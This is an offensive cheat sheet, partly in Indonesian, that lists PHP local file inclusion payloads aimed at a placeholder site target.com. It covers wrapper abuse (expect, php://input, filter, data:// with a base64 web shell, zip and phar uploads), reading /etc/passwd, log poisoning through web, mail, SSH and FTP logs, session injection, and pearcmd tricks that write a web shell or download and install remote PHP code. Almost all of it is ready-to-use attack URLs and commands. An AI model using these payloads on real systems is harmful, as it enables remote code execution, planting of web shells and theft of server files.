# List payload


## **A. PHP WRAPPERS**

### **1. expect://**

```bash
http://target.com/index.php?page=expect://ls
http://target.com/index.php?page=expect://id
```

### **2. php://input** (butuh POST request)

```bash
curl -X POST "http://target.com/index.php?page=php://input" -d "<?php system('id'); ?>"
```

### **3. php://filter**

```bash
# Basic base64 encode
http://target.com/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd

# With compression untuk file besar
http://target.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd

# Filter chain generator
python3 php_filter_chain.py --chain '<?php system("id");?>'
```

### **4. data://**

```bash
# Basic RCE
http://target.com/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=

# XSS payload
http://target.com/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+
```

### **5. zip://**

```bash
# Step 1: Buat shell.php
<pre><?php system($_GET['cmd']); ?></pre>

# Step 2: Compress
zip shell.zip shell.php

# Step 3: Upload as shell.jpg

# Step 4: Execute
http://target.com/index.php?page=zip://shell.zip%23shell.php&cmd=ls
```

### **6. phar://**
```php
# Generator script (phar_generator.php)
<?php
  $phar = new Phar('archive.phar');
  $phar->startBuffering();
  $phar->addFromString('test.txt', '<?php phpinfo(); ?>');
  $phar->setStub('<?php __HALT_COMPILER(); ?>');
  $phar->stopBuffering(); 
?>

# Execute
php --define phar.readonly=0 phar_generator.php

# Trigger LFI
http://target.com/index.php?page=phar:///var/www/html/uploads/archive.phar/test.txt
```

---

## **B. SERVER PATHS**

### **1. Log Files Apache/Nginx**

```bash
# Apache
http://target.com/index.php?page=/var/log/apache2/access.log

# Nginx
http://target.com/index.php?page=/var/log/nginx/access.log

# Poison dengan User-Agent
curl -A "<?php system('id'); ?>" http://target.com/
```

### **2. /proc/*/fd/**
```
http://target.com/index.php?page=/proc/$PID/fd/$FD&cmd=ls

# Brute force PID (1-1000) dan FD (0-50)
```

### **3. /proc/self/environ**
```
http://target.com/index.php?page=/proc/self/environ

# Poison dengan User-Agent
curl -A "<?php phpinfo(); ?>" http://target.com/
```

---

## **C. METODE LAINNYA**

### **1. PHP Sessions**
```
# Baca session
http://target.com/index.php?page=../../../var/lib/php/sessions/sess_[SESSION_ID]

# Inject ke session parameter
username=<?php system("id");?>

# Execute again
http://target.com/index.php?page=../../../var/lib/php/sessions/sess_[SESSION_ID]
```

### **2. Email Logs**
```bash
# Send email via telnet
telnet target.com 25
helo ok
mail from: mail@target.com
rcpt to: root
data
subject: <?php echo system($_GET["cmd"]); ?>
.

# Or via mail command
mail -s "<?php system($_GET['cmd']);?>" www-data@target.com < /dev/null

# Include log
http://target.com/index.php?page=/var/log/mail&cmd=id
```

### **3. SSH Auth Log**
```bash
# Check SSH
nmap target_ip

# Poison SSH log
ssh '<?php system($_GET["cmd"]); ?>'@target.com

# Include log
http://target.com/index.php?page=/var/log/auth.log&cmd=id
```

### **4. FTP Log (vsftpd)**
```bash
# Check FTP
nmap target_ip

# Poison FTP log
ftp target.com
Username: <?php system($_GET['cmd']); ?>

# Include log
http://target.com/index.php?page=/var/log/vsftpd.log&cmd=id
```

### **5. PHP PEARCMD**

```bash
# config-create method
http://target.com/index.php?page=/usr/local/lib/php/pearcmd.php&+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=eval($_GET['cmd'])?>+/tmp/exec.php

# Execute
http://target.com/index.php?page=/tmp/exec.php&cmd=id

# man_dir method
http://target.com/index.php?page=/usr/local/lib/php/pearcmd.php&+-c+/tmp/exec.php+-d+man_dir=<?echo(system($_GET['cmd']));?>+-s+

# download method
http://target.com/index.php?page=/usr/local/lib/php/pearcmd.php&+download+http://127.0.0.1:8000/exec.php

# install method
http://target.com/index.php?page=/usr/local/lib/php/pearcmd.php&+install+http://127.0.0.1:8000/exec.php
```

